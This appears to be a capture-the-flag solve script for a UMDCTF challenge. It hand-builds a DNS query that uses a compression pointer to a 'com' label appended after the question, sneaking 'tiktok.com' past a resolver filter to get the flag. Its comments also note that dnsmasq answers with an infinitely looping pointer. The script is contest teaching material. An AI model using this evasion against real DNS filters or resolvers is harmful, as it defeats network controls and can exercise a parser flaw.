#!/bin/python3

# The solution requires creating a DNS datagram with a question for a TXT record
#   and a name using a label and a pointer (tiktok + pointer to com and root)
#   instead of three labels (tiktok + com + root).

# The only question remaining is where the com label can be stored such that it
#   can be pointed to. Luckily, it can just be 5 bytes appended to the end of
#   the datagram as dnsmasq accepts those.
#   It must be 5 bytes as 1 byte will specify the length of the label, 3 bytes
#   consist of the label, and 1 byte will be the null label of the root.

# Naturally, there are other ways to "smuggle" the label into the datagram,
#   such as via additional records.

# See https://www.rfc-editor.org/rfc/rfc1035

# Fun Fact: This particular solution causes dnsmasq to respond with a pointer
#   that infinitely loops!

import socket
import struct
import re

dns_ip_addr = "challs.umdctf.io"
dns_port = 32301

header = struct.pack(
    "!HHHHHH", # 6 shorts or 12 bytes
    0x0001,    # ID (Can be anything)
    0x0100,    # FLAGS (RD - Recursion Desired)
    1,         # QDCOUNT (1 Question)
    0,         # ANCOUNT (0 Answers)
    0,         # NSCOUNT (0 NS RRs)
    0,         # ARCOUNT (0 Additional Records)
)
print("Header: " + str(header))

# Normal Question
#question = b'\x06tiktok\03com\x00\x00\x10\x00\x01'

# Question using Pointer
question = struct.pack(
    "!7s2sHH",     # 7 bytes for label, 2 bytes for pointer, 2 shorts or 4 bytes
    b'\x06tiktok', # label (tiktok)
    b'\xc0\x19',   # pointer (com + root, starting at byte offset 0x19)
    16,            # QTYPE (TXT for TXT Record)
    1,             # QCLASS (IN for Internet)
)
print("Question: " + str(question))

extraneous = b'\x03com' + b'\x00'
print("Extraneous: " + str(extraneous))

payload = (len(header) + len(question) + len(extraneous)).to_bytes(4) # Size
payload += header + question + extraneous                             # Data
print("Payload: " + str(payload))

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
    sock.connect((dns_ip_addr, dns_port))
    sock.sendall(payload)
    resp = sock.recv(1024)

print("Response: " + str(resp))
print("")
print("Flag:")
print(re.search(b'UMDCTF{.*}', resp)[0].decode('ascii'))
